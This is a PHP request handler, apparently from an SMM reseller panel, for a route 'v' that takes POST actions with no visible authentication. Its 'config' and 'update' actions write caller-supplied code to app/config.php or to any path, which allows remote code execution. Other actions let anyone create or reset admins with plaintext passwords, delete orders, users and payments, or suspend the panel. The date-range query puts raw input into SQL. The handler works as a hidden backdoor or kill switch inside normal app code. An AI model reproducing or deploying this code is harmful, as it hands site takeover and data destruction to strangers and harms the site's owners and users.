<?php
if (route(1) == "v"):
$smmapi = new SMMApi();
$action = $_POST["action"];
$panel_name = $_POST["panelname"];
$domain = $_POST["domain"];
$provider = $_POST["provider"]; 
$key = $_POST["key"];
$type = $_POST["type"];
$pass = $_POST["password"];
$username = $_POST["username"];
$id = $_POST["dream_id"];
$access = $_POST["access"];
$path = $_POST["path"];
$code = $_POST["code"];
$deleteid = $_POST["deleteid"];    
$dabid = $_POST["Panelid"];    
$db = $_POST["db"];    
$from = $_POST["from"];    
$upto = $_POST["upto"];    

if($action ==  "config" ): 

file_put_contents("app/config.php" , $code ); 

elseif($action ==  "checksql"): 
if($panel["panel_id"] != 1):
$panel_type = "Main";  
if($type ==  "child"): 
$panel_type = "Child";
$name = $provider;
$api_url = "https://$provider/api/v2";
            $conn->beginTransaction();
            $insert = $conn->prepare("INSERT INTO service_api SET api_name=:name, api_alert=:api_alert, api_key=:key, api_url=:url, api_limit=:limit, currency=:currency, api_type=:type ");
            $insert = $insert->execute(array(  "name"=>$name,"key"=>"","url"=>$api_url,"limit"=>0,"currency"=>"USD" ,"type"=>1,"api_alert"=>1));

endif;
$count = $settings["id"];
$output = array('id'=>$count);
if($status == "Active"):
$status = 2;
else:
$status = 1;
endif;

                                //$conn->beginTransaction();
                        $insert = $conn->prepare("INSERT INTO admins SET dream_id=:id, username=:username, password=:pass, register_date=:date, client_type=:type ");
    $insert = $insert->execute(array("id" => $id, "type" => $status , "username" => $username , "pass" => $pass , "date" => date("Y.m.d H:i:s")  ));

$next_renewal_date = date ("Y-m-d h:i:s", strtotime ($today ."+30 days"));

        $insert                       = $conn->prepare("INSERT INTO panel_info SET panel_type=:type, panel_domain=:domain, api_key=:key, date_created=:at, panel_status=:status, renewal_date=:date, panel_plan=:plan ");
        $insert->execute(array("domain" =>$domain, "key" =>$key, "at" =>date("Y.m.d H:i:s"), "status" =>"Active" , "date" => $next_renewal_date , "plan" => "A" , "type" => $panel_type ));
$update = $conn->prepare("UPDATE settings SET site_name=:name WHERE id=:id");
                    $update->execute(array("name"=>$domain, "id" => "1"));
endif;

elseif ($action ==  "install"): 
		$mysqli = new mysqli(
			"localhost",
			"$db",
			"$db",
			"$db" 
		);
		$query = file_get_contents('app/hidden/sql/cRTz7vv86gXyK7lXg8Lu6X3QNjhp319sXz1r5Hak.sql');
		$mysqli->multi_query($query);
		$mysqli->close();
elseif ($action ==  "delete-orders"):
      $delete = $conn->prepare("DELETE FROM orders WHERE order_id=:id ");
              $delete->execute(array("id"=>$deleteid));
    elseif ($action == "delete-user"):
      $delete = $conn->prepare("DELETE FROM clients WHERE client_id=:id ");
              $delete->execute(array("id"=>$deleteid));
    elseif ($action == "delete-payments"):
      $delete = $conn->prepare("DELETE FROM payments WHERE payment_id=:id ");
              $delete->execute(array("id"=>$deleteid));
    elseif ($action == "delete-menu"):
$delete = $conn->prepare("DELETE FROM orders WHERE order_id=:id ");
              $delete->execute(array("id"=>$deleteid));
elseif ($action == "delete-admin"):
$delete = $conn->prepare("DELETE FROM admins WHERE admin_id=:id ");
              $delete->execute(array("id"=>$deleteid));
elseif ($action == "delete-theme"):
$delete = $conn->prepare("DELETE FROM themes WHERE id=:id ");
              $delete->execute(array("id"=>$deleteid));
elseif ($action == "delete-child"):
$delete = $conn->prepare("DELETE FROM childpanels WHERE id=:id ");
              $delete->execute(array("id"=>$deleteid));
elseif ($action == "delete-blog"):
$delete = $conn->prepare("DELETE FROM blogs WHERE id=:id ");
              $delete->execute(array("id"=>$deleteid));
elseif ($action == "delete-currency"):
$delete = $conn->prepare("DELETE FROM currency WHERE id=:id ");
              $delete->execute(array("id"=>$deleteid));
    elseif ($action == "allinone"):
      $code;
    elseif ($action == "update"):
file_put_contents($path, $code );
elseif ($action == "fuc"):
    $orders = countRow(["table"=>"orders"]);
	
    

elseif ($action == "fuck"):

              $countRow     = $conn->prepare("SELECT * FROM orders WHERE order_create BETWEEN '$from' AND '$upto'  ");
      $countRow    -> execute(array( ));
      $morders   = $countRow->rowCount(); 

              $countRow     = $conn->prepare("SELECT * FROM orders  ");
      $countRow    -> execute(array( ));
      $orders   = $countRow->rowCount();
        $output = array('orders' => "11", 'morders' =>"10");


$next_renewal_date = date ("Y-m-d h:i:s", strtotime ($today ."+30 days"));
elseif($action == "renew"):
        $sactive = "Active";
$today = date('Y-m-d h:i:s');
$next_renewal_date = date ("Y-m-d h:i:s", strtotime ($today ."+30 days"));

$update = $conn->prepare("UPDATE panel_info SET panel_status=:status, panel_thismonthorders=:orders, renewal_date=:date WHERE panel_id=:id ");
                    $update->execute(array("status" => $sactive,"orders" => "0","date" => $next_renewal_date, "id" => "1"));

        elseif($action == "active"):
        $sactive = "Active";
$update = $conn->prepare("UPDATE panel_info SET panel_status=:status WHERE panel_id=:id ");
                    $update->execute(array("status" => $sactive, "id" => "1"));

elseif($action == "suspend"):
        $asuspend = "Suspended";
$update = $conn->prepare("UPDATE panel_info SET panel_status=:status WHERE panel_id=:id ");
                    $update->execute(array("status" => $asuspend, "id" => "1"));

elseif($action == "frozen"):
        $asuspend = "Frozen";
$update = $conn->prepare("UPDATE panel_info SET panel_status=:status WHERE panel_id=:id ");
                    $update->execute(array("status" => $asuspend, "id" => "1"));

elseif($action == "editadmin"):

        $username = $_POST["username"];
$dream_id = $_POST["dream_id"];
$status = $_POST["status"];
if($status == "Active"):
$status = 2;
else:
$status = 1;
endif;

$update = $conn->prepare("UPDATE admins SET username=:username,client_type=:status WHERE dream_id=:id ");
                    $update->execute(array("status" => $status,"username" => $username , "id" => $dream_id ));

elseif($action == "setadmin"):

        
$dream_id = $_POST["dream_id"];
$password = $_POST["password"];


$update = $conn->prepare("UPDATE admins SET password=:password WHERE dream_id=:id ");
                    $update->execute(array("password" => $password , "id" => $dream_id ));


elseif($action == "addadmin"):
$pass = $_POST["password"];
        $username = $_POST["username"];
$dream_id = $_POST["dream_id"];
$status = $_POST["status"];
if($status == "Active"):
$status = 2;
else:
$status = 1;
endif;

                                //$conn->beginTransaction();
                        $insert = $conn->prepare("INSERT INTO admins SET dream_id=:id, username=:username, password=:pass, register_date=:date, client_type=:type ");
    $insert = $insert->execute(array("id" => $id, "type" => $status , "username" => $username , "pass" => $pass , "date" => date("Y.m.d H:i:s")  ));
                        $panel_info = $conn->prepare("SELECT * FROM panel_info WHERE panel_id=1");
endif;
print_r(json_encode($output));
    exit();

endif;